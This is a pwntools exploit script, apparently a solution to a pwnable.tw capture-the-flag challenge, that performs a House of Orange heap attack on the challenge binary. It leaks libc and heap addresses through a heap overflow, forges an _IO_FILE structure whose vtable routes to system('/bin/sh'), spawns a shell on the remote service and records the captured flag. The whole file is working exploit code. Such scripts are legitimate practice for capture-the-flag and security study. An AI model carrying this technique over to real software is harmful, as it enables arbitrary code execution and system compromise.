import argparse
import sys
sys.path.append('/home/coraline/CTF/pwn-dev/scripts/')
from pwn import *
from pwnfast import Pwn

_p = argparse.ArgumentParser()
_p.add_argument('-d', action="store_true")
_p.add_argument('-r', action="store_true")
_args = _p.parse_args()

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']

PROG = './chal'
libc = ELF('./libc_64.so.6')

### ------------------ EXPLOIT ------------------ ###

r = Pwn(PROG, debug=_args.d) if not _args.r else Pwn(PROG, conn='chall.pwnable.tw 10304')
r.sym.update({
    'my_read': 0x400856,
    'add': 0x4009aa,
    'view': 0x400a99,
    'edit': 0x400b27,
    'info': 0x400c04,
})

def add(size, data):
    r.sla(b'choice :', b'1')
    r.sla(b'page :', str(size).encode())
    r.sla(b'Content :', data)

def view(idx):
    r.sla(b'choice :', b'2')
    r.sla(b'page :', str(idx).encode())

def edit(idx, data):
    r.sla(b'choice :', b'3')
    r.sla(b'page :', str(idx).encode())
    r.sla(b'Content:', data)

def info(change, get_addr):
    r.sla(b'choice :', b'4')
    if get_addr:
        r.ru(b'P' * 0x40)
        top_addr = u64(r.rl().strip().ljust(8, b'\x00'))
    r.sla(b') ', str(change).encode())
    return top_addr or -1


r.sla(b'Author :', b'P' * 0x40)

# Read top chunk size
add(0x18, b'A' * 0x18)
view(0)
r.ru(b'A' * 0x18)
top_size = u64(r.rl().strip().ljust(8, b'\x00'))
log.info(f'Top chunk size: {hex(top_size)}')

# Update page size since strlen will read top chunk size
edit(0, b'B' * 0x18)
# Overwrite top chunk size to 0xfe0
edit(0, b'C' * 0x18 + p64(0xfe1))

# Free top chunk and reserve a piece (broken from the freed chunk)
add(0x1000, b'')
add(0x8, b'D' * 8)

# Libc leak
view(2)
r.ru(b'D' * 8)
libc_leak = u64(r.rl().strip().ljust(8, b'\x00'))
libc.address = libc_leak - 0x3c4188
log.info(f'Libc base: {hex(libc.address)}')

# Leak heap address
chunk_addr = info(0, True)
log.info(f'Heap addr: {hex(chunk_addr)}')

# Fill up PAGES
for _ in range(5):
    add(0x18, b'')

# Overwrite first page_size data entry with a page (overlap)
# Have to clear out size=0 to pass check in add()
edit(0, b'')
add(0x28, b'')

# Create fake file structures
fs_vtable_addr = chunk_addr + 0xe0
fs_vtable = p64(0) * 3
fs_vtable += p64(libc.symbols['system'])     # vtable->_IO_OVERFLOW

fs = b'/bin/sh\x00'         # _flags / Top chunk start
fs += p64(0x61)             # _IO_read_ptr  / chunk size
fs += p64(libc_leak)        # _IO_read_end / fd
fs += p64(libc.symbols['_IO_list_all'] - 0x10) 
    # _IO_read_base / bk
fs += p64(2)                # _IO_write_base
fs += p64(3)                # _IO_write_ptr
fs += p64(0)                # _IO_write_end
fs += p64(0) * 5            # _IO_buf_base, _IO_buf_end, _IO_save_base, _IO_backup_base, _IO_save_end
fs += p64(0) * 15           # Rest
fs += p64(fs_vtable_addr)   # Jump table

# Use heap buffer overflow to write in fake file structure
chunks = p64(0) + p64(0x21) + (b'B' * 0x10)
pay = b'A' * 0x10
pay += chunks * 6
pay += p64(0) + p64(0x31) + fs_vtable  # fs_vtable right before freed top (calculated addr above)
pay += fs

r.gdb(r.call('edit', 'my_read'))
edit(0, pay)

# House of Orange is setup - now trigger a malloc
edit(0, b'')
# Attempt to add a new page
r.sla(b':', b'1')
r.sla(b':', b'1')

r.interactive()
# FLAG{Th3r3_4r3_S0m3_m4gic_in_t0p}
